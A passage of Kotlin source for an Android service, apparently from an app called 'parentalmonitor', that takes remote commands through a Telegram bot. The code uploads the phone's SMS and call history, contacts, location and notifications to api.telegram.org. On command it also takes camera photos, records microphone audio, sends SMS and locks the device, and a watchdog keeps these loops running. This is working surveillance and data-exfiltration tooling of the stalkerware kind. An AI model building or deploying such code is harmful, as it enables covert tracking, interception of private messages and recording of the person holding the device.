                                appendLine("\u2022 " + Html.escape(item.app) + ": " + Html.escape(item.title.take(80)) + " \u2014 " + Html.escape(item.text.take(120)))
                            }
                        }
                    )
                }
            }
            "/version" -> {
                sendToTelegram(
                    buildString {
                        appendLine("\u2139\uFE0F <b>Version</b>")
                        appendLine("App: " + com.redeye.parentalmonitor.BuildConfig.VERSION_NAME + " (" + com.redeye.parentalmonitor.BuildConfig.VERSION_CODE + ")")
                        appendLine("Android: " + Build.VERSION.SDK_INT + " (" + Build.VERSION.RELEASE + ")")
                        appendLine("Device: " + Build.MANUFACTURER + " " + Build.MODEL)
                    }
                )
            }
            "/uptime" -> {
                val started = serviceStartAt
                if (started <= 0) {
                    sendToTelegram("\u23F1\uFE0F Uptime unknown.")
                } else {
                    val minutes = (System.currentTimeMillis() - started) / 60_000L
                    val hours = minutes / 60
                    val days = hours / 24
                    val span = when {
                        days > 0 -> "$days d ${hours % 24} h"
                        hours > 0 -> "$hours h ${minutes % 60} m"
                        else -> "$minutes m"
                    }
                    sendToTelegram("\u23F1\uFE0F <b>Uptime</b>\nRunning: $span\nSince: " + formatDate(started))
                }
            }
            "/contacts" -> {
                if (arg.isEmpty()) {
                    sendToTelegram("Usage: /contacts \u003cnama\u003e")
                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("\u26A0\uFE0F Contacts permission missing. Open Setup and grant Contacts permission.")
                } else {
                    val found = searchContacts(arg.take(40))
                    if (found.isEmpty()) {
                        sendToTelegram("\uD83D\uDC64 No contacts matching that name.")
                    } else {
                        sendToTelegram(
                            buildString {
                                appendLine("\uD83D\uDC64 <b>Contacts (${found.size})</b>")
                                for (entry in found) {
                                    appendLine("\u2022 " + Html.escape(entry.first) + " \u2014 " + Html.escape(entry.second))
                                }
                            }
                        )
                    }
                }
            }
            "/apps" -> {
                val limit = arg.toIntOrNull()?.coerceIn(5, 50) ?: 30
                val apps = listLaunchableApps(limit)
                if (apps.isEmpty()) {
                    sendToTelegram("\uD83D\uDCE6 No apps found.")
                } else {
                    sendToTelegram(
                        buildString {
                            appendLine("\uD83D\uDCE6 <b>Apps (${apps.size})</b>")
                            for (label in apps) {
                                appendLine("\u2022 " + Html.escape(label))
                            }
                        }
                    )
                }
            }
            "/storage" -> {
                sendToTelegram(
                    buildString {
                        appendLine("\uD83D\uDCBE <b>Storage</b>")
                        appendLine("Cache: " + formatBytes(dirSize(cacheDir)) + " (" + pendingPhotoCount() + " photos)")
                        appendLine("Files: " + formatBytes(dirSize(filesDir)))
                        appendLine("Queued: ${messageQueue.getQueueSize()}")
                    }
                )
            }
            "/history" -> {
                val digits = arg.filter { it.isDigit() }
                if (digits.length < 3) {
                    sendToTelegram("Usage: /history \u003cnomor\u003e")
                } else {
                    val calls = try {
                        callLogRepository.getCallsForNumber(digits, 50).filter { it.number.filter { c -> c.isDigit() }.contains(digits) }.take(5)
                    } catch (_: Exception) {
                        emptyList()
                    }
                    val sms = try {
                        smsRepository.getSmsForNumber(digits, 50).filter { it.address.filter { c -> c.isDigit() }.contains(digits) }.take(5)
                    } catch (_: Exception) {
                        emptyList()
                    }
                    if (calls.isEmpty() && sms.isEmpty()) {
                        sendToTelegram("\uD83D\uDD0E No history for $digits.")
                    } else {
                        if (calls.isNotEmpty()) sendToTelegram(formatCallMessage(calls))
                        if (sms.isNotEmpty()) sendToTelegram(formatSmsMessage(sms))
                    }
                }
            }
            "/help", "/start" -> {
                sendToTelegram(
                    buildString {
                        appendLine("👆 <b>Tap a button below</b>")
                        appendLine()
                        appendLine("🤖 <b>Commands</b>")
                        appendLine("/photo - take a photo now")
                        appendLine("/camera \u003cdepan|belakang\u003e - switch camera")
                        appendLine("/location - send current location")
                        appendLine("/lastcalls - show last 5 calls")
                        appendLine("/lastsms - show last 5 SMS")
                        appendLine("/photointerval \u003c0-60\u003e - set photo interval (0 = manual)")
                        appendLine("/pause \u003cminutes\u003e - pause photos")
                        appendLine("/battery - show battery level")
                        appendLine("/status - show monitoring status")
                        appendLine("/stop - pause monitoring")
                        appendLine("/resume - resume monitoring")
                        appendLine("/notif <on|off|status> - notif forwarding")
                        appendLine("/syncinterval \u003c1-1440\u003e - set sync interval")
                        appendLine("/restart - restart monitoring loops")
                        appendLine("/flush - send queued messages now")
                        appendLine("/clearqueue - drop queued messages")
                        appendLine("/lock - lock device screen")
                        appendLine("/ring [5-60] - ring device aloud")
                        appendLine("/ping - check bot delay")
                        appendLine("/record \u003c5-60\u003e - record audio seconds")
                        appendLine("/sms \u003cnomor\u003e \u003cpesan\u003e - send SMS")
                        appendLine("/lastnotif - show last notifications")
                        appendLine("/version - show app/device version")
                        appendLine("/uptime - show service uptime")
                        appendLine("/contacts \u003cnama\u003e - search contacts")
                        appendLine("/apps [N] - list installed apps")
                        appendLine("/storage - show storage usage")
                        appendLine("/history \u003cnomor\u003e - calls+SMS by number")
                        appendLine("/log - show last crash/error log")
                        appendLine("/help - show this list")
                    },
                    mainMenu()
                )
            }
            else -> {
                sendToTelegram("\u2753 Unknown command: $command. Send /help for the list.")
            }
        }
    }

    private fun selectedLensFacing(): Int {
        return if (preferencesManager.cameraFacing == "back") {
            android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
        } else {
            android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
        }
    }

    private fun isPhotoPaused(): Boolean {
        return System.currentTimeMillis() < preferencesManager.photoPausedUntil
    }

    private fun hasBackgroundLocation(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return true
        return androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun isNotifForwarding(): Boolean {
        if (!preferencesManager.notifForwardEnabled) return false
        return try {
            androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
        } catch (_: Exception) {
            false
        }
    }

    private fun hasLocationPermission(): Boolean {
        val fine = androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_FINE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        val coarse = androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_COARSE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        return fine || coarse
    }

    @Suppress("DEPRECATION")
    private suspend fun fetchLocation(): android.location.Location? {
        if (!hasLocationPermission()) return null
        return withContext(Dispatchers.IO) {
            try {
                val locationManager = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
                val providers = listOf(
                    android.location.LocationManager.GPS_PROVIDER,
                    android.location.LocationManager.NETWORK_PROVIDER
                ).filter {
                    try {
                        locationManager.isProviderEnabled(it)
                    } catch (_: Exception) {
                        false
                    }
                }
                for (provider in providers) {
                    try {
                        val last = locationManager.getLastKnownLocation(provider)
                        if (last != null && System.currentTimeMillis() - last.time < 120_000L) {
                            return@withContext last
                        }
                    } catch (_: SecurityException) {
                        return@withContext null
                    }
                }
                val chosen = providers.firstOrNull() ?: return@withContext null
                val result = CompletableDeferred<android.location.Location?>()
                val listener = object : android.location.LocationListener {
                    override fun onLocationChanged(location: android.location.Location) {
                        result.complete(location)
                    }
                    override fun onProviderDisabled(provider: String) {}
                    override fun onProviderEnabled(provider: String) {}
                }
                try {
                    @Suppress("DEPRECATION")
                    locationManager.requestSingleUpdate(chosen, listener, android.os.Looper.getMainLooper())
                } catch (_: SecurityException) {
                    return@withContext null
                }
                try {
                    withTimeoutOrNull(20_000) { result.await() }
                } finally {
                    try {
                        locationManager.removeUpdates(listener)
                    } catch (_: Exception) {
                    }
                }
            } catch (_: Exception) {
                null
            }
        }
    }

    private suspend fun sendInitialData() {
        try {
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Collecting SMS history...")
            // Get all history first
            val allSms = smsRepository.getRecentSms(100)
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${allSms.size} SMS messages")
            
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Collecting call history...")
            val allCalls = callLogRepository.getAllCalls(100)
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${allCalls.size} calls")

            // Send start message
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending start message...")
            val startMessage = buildString {
                appendLine("📱 <b>Monitoring started</b>")
                appendLine()
                appendLine("⏰ Time: ${formatDate(System.currentTimeMillis())}")
                appendLine()
                appendLine("📊 Found on device:")
                appendLine("• SMS: ${allSms.size}")
                appendLine("• Calls: ${allCalls.size}")
                appendLine()
                appendLine("Sending history...")
            }
            sendToTelegram(startMessage)
            delay(500)

            // Send all SMS history in chunks
            if (allSms.isNotEmpty()) {
                val chunks = allSms.chunked(10)
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${chunks.size} SMS chunks...")
                chunks.forEachIndexed { index, chunk ->
                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Sending SMS chunk ${index + 1}/${chunks.size}")
                    val message = buildString {
                        appendLine("💬 <b>SMS History - part ${index + 1}/${chunks.size}</b>")
                        appendLine()
                        chunk.forEach { sms ->
                            appendLine("📞 Number: ${Html.escape(sms.address)}")
                            val body = Html.escape(sms.body.take(200)) // Limit SMS body to 200 chars
                            appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                            appendLine("🔄 Type: ${sms.getTypeString()}")
                            appendLine("⏰ Time: ${formatDate(sms.date)}")
                            appendLine("━━━━━━━━━━━━━━━━")
                        }
                    }
                    sendFitted(message)
                    preferencesManager.lastSmsId = chunk.maxOf { it.id }
                    delay(500)
                }
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All SMS chunks sent")
            }

            // Send all call history in chunks
            if (allCalls.isNotEmpty()) {
                val chunks = allCalls.chunked(10)
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${chunks.size} call chunks...")
                chunks.forEachIndexed { index, chunk ->
                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Sending call chunk ${index + 1}/${chunks.size}")
                    val message = buildString {
                        appendLine("📞 <b>Call History - part ${index + 1}/${chunks.size}</b>")
                        appendLine()
                        chunk.forEach { call ->
                            appendLine("📱 Number: ${Html.escape(call.number)}")
                            if (call.name != null) {
                                appendLine("👤 Name: ${Html.escape(call.name)}")
                            }
                            appendLine("🔄 Type: ${call.getTypeString()}")
                            appendLine("⏱️ Duration: ${call.getDurationString()}")
                            appendLine("⏰ Time: ${formatDate(call.date)}")
                            appendLine("━━━━━━━━━━━━━━━━")
                        }
                    }
                    sendFitted(message)
                    val latest = chunk.maxWith(compareBy({ it.date }, { it.id }))
                    preferencesManager.lastCallTimestamp = latest.date
                    preferencesManager.lastCallId = latest.id
                    delay(500)
                }
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All call chunks sent")
            }

            // Final message
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending completion message...")
            val photoState = if (isPhotoPaused()) {
                "paused until ${formatDate(preferencesManager.photoPausedUntil)}"
            } else if (preferencesManager.cameraInterval <= 0) {
                "manual only (/photo)"
            } else {
                "every ${preferencesManager.cameraInterval} min"
            }
            val completeMessage = buildString {
                appendLine("✅ <b>History sync complete</b>")
                appendLine()
                appendLine("From now on, only new SMS and calls will be sent.")
                appendLine()
                appendLine("📊 <b>Now</b>")
                appendLine("Monitoring: ON")
                appendLine("Data interval: ${preferencesManager.syncInterval} min")
                appendLine("Photos: $photoState")
                appendLine("Queued: ${messageQueue.getQueueSize()}")
                appendLine()
                appendLine("All commands are in the bot menu — tap /help anytime.")
            }
            sendToTelegram(completeMessage)
            preferencesManager.initialSyncDone = true
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")

        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error in initial sync: ${redactToken(e.message)}")
        }
    }

    private suspend fun checkAndSendNewData() {
        if (initialSyncRunning.get()) return
        try {
            val smsPage = smsRepository.getNewSms(preferencesManager.lastSmsId)
            if (smsPage.isNotEmpty()) {
                val chunks = smsPage.chunked(10)
                chunks.forEachIndexed { index, chunk ->
                    sendFitted(formatSmsMessage(chunk))
                    preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, chunk.maxOf { it.id })
                    if (index < chunks.size - 1) delay(500)
                }
            }
            val callPage = callLogRepository.getNewCalls(preferencesManager.lastCallTimestamp, preferencesManager.lastCallId)
            if (callPage.isNotEmpty()) {
                val chunks = callPage.chunked(10)
                chunks.forEachIndexed { index, chunk ->
                    sendFitted(formatCallMessage(chunk))
                    val latest = chunk.maxWith(compareBy({ it.date }, { it.id }))
                    if (latest.date > preferencesManager.lastCallTimestamp ||
                        (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
                    ) {
                        preferencesManager.lastCallTimestamp = latest.date
                        preferencesManager.lastCallId = latest.id
                    }
                    if (index < chunks.size - 1) delay(500)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error checking new data", e)
        }
    }

    private fun formatSmsMessage(smsList: List<com.redeye.parentalmonitor.data.models.SmsData>): String {
        return buildString {
            appendLine("💬 <b>New SMS (${smsList.size})</b>")
            appendLine()
            
            smsList.forEach { sms ->
                appendLine("📞 Number: ${Html.escape(sms.address)}")
                val body = Html.escape(sms.body.take(200)) // Limit to 200 chars
                appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                appendLine("🔄 Type: ${sms.getTypeString()}")
                appendLine("⏰ Time: ${formatDate(sms.date)}")
                appendLine("━━━━━━━━━━━━━━━━")
            }
        }
    }

    private fun formatCallMessage(callList: List<com.redeye.parentalmonitor.data.models.CallData>): String {
        return buildString {
            appendLine("📞 <b>New calls (${callList.size})</b>")
            appendLine()
            
            callList.forEach { call ->
                appendLine("📱 Number: ${Html.escape(call.number)}")
                if (call.name != null) {
                    appendLine("👤 Name: ${Html.escape(call.name)}")
                }
                appendLine("🔄 Type: ${call.getTypeString()}")
                appendLine("⏱️ Duration: ${call.getDurationString()}")
                appendLine("⏰ Time: ${formatDate(call.date)}")
                appendLine("━━━━━━━━━━━━━━━━")
            }
        }
    }

    private fun safeCut(text: String, max: Int): Int {
        if (text.length <= max) return text.length
        var cut = max
        if (Character.isHighSurrogate(text[cut - 1]) && Character.isLowSurrogate(text[cut])) cut -= 1
        val amp = text.lastIndexOf('&', cut - 1)
        if (amp >= 0 && amp > cut - 12) {
            val semi = text.indexOf(';', amp)
            if (semi < 0 || semi >= cut) {
                val entity = text.substring(amp, cut)
                if (entity.all { it.isLetterOrDigit() || it == '&' || it == '#' }) cut = amp
            }
        }
        if (cut <= 0) cut = max
        return cut
    }
    private suspend fun sendFitted(message: String) {
        if (message.length <= 4000) {
            sendToTelegram(message)
            return
        }
        val lines = message.split("\n")
        var current = StringBuilder()
        for (line in lines) {
            var rest = line
            while (rest.length > 4000) {
                if (current.isNotEmpty()) {
                    sendToTelegram(current.toString())
                    delay(500)
                    current = StringBuilder()
                }
                val cut = safeCut(rest, 4000)
                sendToTelegram(rest.substring(0, cut))
                delay(500)
                rest = rest.substring(cut)
            }
            if (current.length + rest.length + 1 > 4000) {
                if (current.isNotEmpty()) {
                    sendToTelegram(current.toString())
                    delay(500)
                }
                current = StringBuilder()
            }
            if (current.isNotEmpty()) current.append("\n")
            current.append(rest)
        }
        if (current.isNotEmpty()) sendToTelegram(current.toString())
    }

    private suspend fun sendToTelegram(
        message: String,
        replyMarkup: com.redeye.parentalmonitor.network.InlineKeyboardMarkup? = null
    ) {
        try {
            if (message.length > 4096) {
                android.util.Log.e("MonitoringService", "Message too long: ${message.length} chars, splitting")
                sendFitted(message)
                return
            }
            
            val (botToken, chatId) = sendCreds()

            if (botToken.isEmpty() || chatId.isEmpty()) {
                android.util.Log.e("MonitoringService", "Bot token or chat ID is empty!")
                return
            }

            val hasNetwork = hasNetwork()
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Network available: $hasNetwork")
            
            if (!hasNetwork) {
                // No internet, add to queue
                android.util.Log.w("MonitoringService", "No network, adding to queue")
                messageQueue.addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
                return
            }

            val telegramMessage = TelegramMessage(
                chatId = chatId,
                text = message,
                parseMode = "HTML",
                replyMarkup = replyMarkup
            )

            val url = "https://api.telegram.org/bot${botToken}/sendMessage"
            val response = TelegramClient.api.sendMessage(url, telegramMessage)

            if (response.isSuccessful && response.body()?.ok == true) {
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Message sent")
                preferencesManager.lastSyncTime = System.currentTimeMillis()
                try {
                    preferencesManager.credentialError = ""
                    preferencesManager.credentialErrorAt = 0L
                } catch (_: Exception) {
                }
            } else if (response.code() == 429) {
                val retryAfter = NetworkUtils.parseRetryAfter(response.errorBody()?.string())
                android.util.Log.w("MonitoringService", "Rate limited, will retry via queue after ${retryAfter}s")
                messageQueue.addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
            } else if (response.code() == 400 || response.code() == 401 || response.code() == 403) {
                android.util.Log.e("MonitoringService", "Auth rejected (${response.code()}), not queuing")
                try {
                    preferencesManager.credentialError = response.code().toString()
                    preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
                } catch (_: Exception) {
                }
            } else {
                android.util.Log.e("MonitoringService", "✗ Failed to send: ${response.code()}")
                messageQueue.addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
            }
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "✗ Exception sending message: ${redactToken(e.message)}", e)
            messageQueue.addMessage(message)
            MessageScheduler.scheduleMessageSend(this)
        }
    }

    private fun syncIntervalMillis(): Long {
        return preferencesManager.syncInterval.coerceIn(1, 1440) * 60_000L
    }

    private fun formatDate(timestamp: Long): String {
        return TimeFmt.full(timestamp)
    }

    private fun stopMonitoring() {
        monitoringJob?.cancel()
        cameraJob?.cancel()
        commandJob?.cancel()
        initialSyncJob?.cancel()
        initialSyncRunning.set(false)
        try {
            loopWatchdogJob?.cancel()
        } catch (_: Exception) {
        }
        watchdogJob?.cancel()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        try { credsListener?.let { preferencesManager.unregisterChangeListener(it) } } catch (_: Exception) { }
        super.onDestroy()
        serviceScope.cancel()
    }
    
    // ═══════════════════════════════════════════════════════════
    // CAMERA MONITORING FUNCTIONS
    // ═══════════════════════════════════════════════════════════
    
    private fun captureAndSendPhoto(reportResult: Boolean = false) {
        if (pendingPhotoCount() >= 10) {
            prunePhotoCache()
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("⚠️ Photo backlog full (offline). Oldest unsent kept; newest capture skipped.")
                } else {
                    notifyCameraFailure("photo backlog full")
                }
            }
            return
        }
        if (!hasCameraPermission()) {
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture failed: camera permission missing. Open Setup and grant Camera permission.")
                } else {
                    notifyCameraFailure("camera permission missing")
                }
            }
            return
        }
        if (isCameraDisabledByPolicy()) {
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture failed: camera disabled by device policy (CAMERA_DISABLED). " + cameraFailureHint("CAMERA_DISABLED"))
                } else {
                    notifyCameraFailure("camera disabled by device policy (CAMERA_DISABLED)")
                }
            }
            return
        }
        if (!cameraBusy.compareAndSet(false, true)) {
            if (reportResult) {
                serviceScope.launch {
                    sendToTelegram("⚠️ Camera is busy, please try /photo again in a moment.")
                }
            }
            return
        }
        watchdogJob?.cancel()
        val attempt = cameraAttempt.incrementAndGet()
        val wd = serviceScope.launch {
            delay(50_000)
            if (cameraAttempt.get() == attempt && cameraBusy.compareAndSet(true, false)) {
                android.util.Log.w("MonitoringService", "Camera watchdog: capture did not finish, flag reset")
                try {
                    cameraService.forceReset()
                } catch (_: Exception) {
                }
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture timed out without a response. Please try /photo again.")
                }
            }
        }
        watchdogJob = wd
        try {
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "📸 Starting camera capture...")
            cameraService.capturePhoto(
                lensFacing = selectedLensFacing(),
                onPhotoTaken = { photoFile ->
                    if (cameraAttempt.get() != attempt) return@capturePhoto
                    cameraAttempt.incrementAndGet()
                    cameraBusy.set(false)
                    try {
                        wd.cancel()
                    } catch (_: Exception) {
                    }
                    serviceScope.launch {
                        val sent = sendPhotoFile(photoFile)
                        if (sent) {
                            flushPendingPhotos()
                        } else {
                            prunePhotoCache()
                            if (reportResult) {
                                sendToTelegram("⚠️ Photo captured but upload failed. File kept for retry.")
                            }
                        }
                    }
                },
                onError = { exception ->
                    if (cameraAttempt.get() != attempt) return@capturePhoto
                    cameraAttempt.incrementAndGet()
                    cameraBusy.set(false)
                    try {
                        wd.cancel()
                    } catch (_: Exception) {
                    }
                    android.util.Log.e("MonitoringService", "✗ Camera capture failed: ${exception.message}")
                    serviceScope.launch {
                        if (reportResult) {
                            sendToTelegram("⚠️ Photo capture failed: ${exception.message ?: "unknown error"}. " + cameraFailureHint(exception.message))
                        } else {
                            notifyCameraFailure(exception.message ?: "unknown error")
                        }
                    }
                }
            )
        } catch (e: Exception) {
            cameraAttempt.incrementAndGet()
            cameraBusy.set(false)
            watchdogJob?.cancel()
            android.util.Log.e("MonitoringService", "✗ Error in captureAndSendPhoto", e)
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture failed: ${e.message ?: "unknown error"}.")
                } else {
                    notifyCameraFailure(e.message ?: "unknown error")
                }
            }
        }
    }
    
    private suspend fun notifyCameraFailure(reason: String) {
        try {
            val now = android.os.SystemClock.elapsedRealtime()
            val last = preferencesManager.lastCameraErrorNotice
            if (last in 1L..999_999_999_999L && now - last < 30 * 60_000L) return
            preferencesManager.lastCameraErrorNotice = now
            sendToTelegram("⚠️ Photo capture failed: $reason. " + cameraFailureHint(reason))
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error sending camera notice", e)
        }
    }

    private suspend fun notifyPhotoSendFailure(detail: String) {
        try {
            val now = android.os.SystemClock.elapsedRealtime()
            val last = preferencesManager.lastUploadErrorNotice
            if (last in 1L..999_999_999_999L && now - last < 30 * 60_000L) return
            preferencesManager.lastUploadErrorNotice = now
            sendToTelegram("⚠️ Photo upload failed ($detail). Will retry automatically.")
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error sending upload notice", e)
        }
    }

    private fun hasMicPermission(): Boolean {
        return androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.RECORD_AUDIO
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun hasCameraPermission(): Boolean {
        return androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.CAMERA
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun isCameraPolicyError(reason: String?): Boolean {
        if (reason == null) return false
        return reason.contains("CAMERA_DISABLED", ignoreCase = true) ||
            reason.contains("disabled by policy", ignoreCase = true) ||
            reason.contains("Camera error: 1")
    }

    private fun isCameraDisabledByPolicy(): Boolean {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            try {
                if (dpm.getCameraDisabled(null)) return true
            } catch (_: Exception) {
            }
            try {
                val admin = android.content.ComponentName(this, com.redeye.parentalmonitor.receiver.AdminReceiver::class.java)
                if (dpm.getCameraDisabled(admin)) return true
            } catch (_: Exception) {
            }
        } catch (_: Exception) {
            return false
        }
        return false
    }

    private fun cameraFailureHint(reason: String?): String {
        if (!hasCameraPermission()) return "Open Setup and grant Camera permission."
        if (isCameraPolicyError(reason) || isCameraDisabledByPolicy()) return "Camera is blocked by device policy (another admin app, work profile, or parental control disabled it). Check Settings > Security > Device admin apps, remove the camera restriction, or pause photos with /pausephoto."
        return "The camera may be in use by another app."
    }

    private fun pendingPhotoCount(): Int {
        return try {
            cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
            }?.size ?: 0
        } catch (_: Exception) {
            0
        }
    }

    private suspend fun sendPhotoToTelegram(photoFile: File) {
        if (sendPhotoFile(photoFile)) {
            flushPendingPhotos()
        } else {
            prunePhotoCache()
        }
    }

    private fun restartAllLoops() {
        startPeriodicLoops()
        startCommandPolling()
    }
    private fun startLoopWatchdog() {
        try {
            loopWatchdogJob?.cancel()
        } catch (_: Exception) {
        }
        loopWatchdogJob = serviceScope.launch {
            while (isActive && loopWatchdogJob === coroutineContext[Job]) {
                try {
                    delay(300_000L)
                } catch (e: java.util.concurrent.CancellationException) {
                    throw e
                } catch (_: Exception) {
                    continue
                }
                try {
                    if (monitoringJob?.isActive != true || cameraJob?.isActive != true || commandJob?.isActive != true) {
                        android.util.Log.w("MonitoringService", "Loop watchdog: restarting dead loops")
                        restartAllLoops()
                        val now = android.os.SystemClock.elapsedRealtime()
                        if (now - loopWatchdogNoticeAt > 3_600_000L) {
                            loopWatchdogNoticeAt = now
                            sendToTelegram("\u267B\uFE0F Watchdog restarted dead loops.")
                        }
                    }
                } catch (e: java.util.concurrent.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Loop watchdog error", e)
                }
            }
        }
    }

    private suspend fun ringDevice(seconds: Int) {
        val audioManager = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
        val stream = android.media.AudioManager.STREAM_ALARM
        val previous = try {
            audioManager.getStreamVolume(stream)
        } catch (_: Exception) {
            -1
        }
        preferencesManager.ringPrevVolume = previous
        var ringtone: android.media.Ringtone? = null
        try {
            try {
                audioManager.setStreamVolume(stream, audioManager.getStreamMaxVolume(stream), 0)
            } catch (_: Exception) {
            }
            val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
            ringtone = android.media.RingtoneManager.getRingtone(applicationContext, uri)
            ringtone?.play()
            sendToTelegram("\uD83D\uDD14 Ringing for $seconds s\u2026")
            kotlinx.coroutines.delay(seconds * 1000L)
            sendToTelegram("\uD83D\uDD14 Ring finished.")
        } catch (e: Exception) {
            sendToTelegram("\u26A0\uFE0F Ring failed.")
        } finally {
            try {
                ringtone?.stop()
            } catch (_: Exception) {
            }
            try {
                if (previous >= 0) audioManager.setStreamVolume(stream, previous, 0)
            } catch (_: Exception) {
            }
            preferencesManager.ringPrevVolume = -1
        }
    }

    @Suppress("DEPRECATION")
    private suspend fun recordAndSendAudio(seconds: Int) {
        val audioFile = File(cacheDir, "audio_" + System.currentTimeMillis() + ".m4a")
        var recorder: android.media.MediaRecorder? = null
        try {
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.media.MediaRecorder(this)
            } else {
                android.media.MediaRecorder()
            }
            recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
            recorder.setOutputFile(audioFile.absolutePath)
            recorder.prepare()
            recorder.start()
            kotlinx.coroutines.delay(seconds * 1000L)
            try {
                recorder.stop()
            } catch (_: Exception) {
            }
            if (sendAudioFile(audioFile)) {
                sendToTelegram("\uD83C\uDF99\uFE0F Audio sent (${seconds}s).")
            } else {
                sendToTelegram("\u26A0\uFE0F Audio recorded but send failed.")
            }
        } catch (e: SecurityException) {
            sendToTelegram("\u26A0\uFE0F Microphone permission missing. Open Setup and grant Microphone permission.")
        } catch (e: Exception) {
            sendToTelegram("\u26A0\uFE0F Record failed.")
        } finally {
            try {
                recorder?.release()
            } catch (_: Exception) {
            }
            secureDelete(audioFile)
        }
    }

    private suspend fun sendAudioFile(audioFile: File): Boolean {
        try {
            if (!hasNetwork()) return false
            val (botToken, chatId) = sendCreds()
            if (botToken.isEmpty() || chatId.isEmpty()) return false
            val requestFile = audioFile.asRequestBody("audio/mp4".toMediaTypeOrNull())
            val audioPart = MultipartBody.Part.createFormData("audio", audioFile.name, requestFile)
            val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())
            val caption = ("\uD83C\uDF99\uFE0F " + TimeFmt.full(System.currentTimeMillis())).toRequestBody("text/plain".toMediaTypeOrNull())
            val url = "https://api.telegram.org/bot$botToken/sendAudio"
            val response = TelegramClient.api.sendAudio(url, chatIdBody, caption, audioPart)
            if (response.isSuccessful && response.body()?.ok == true) {
                preferencesManager.lastSyncTime = System.currentTimeMillis()
                return true
            }
            if (response.code() == 400 || response.code() == 401 || response.code() == 403) {
                try {
                    preferencesManager.credentialError = response.code().toString()
                    preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
                } catch (_: Exception) {
                }
            }
            return false
        } catch (e: Exception) {
            return false
        }
    }

    private fun searchContacts(query: String): List<Pair<String, String>> {
        val out = mutableListOf<Pair<String, String>>()
        try {
            val uri = android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI
            val projection = arrayOf(
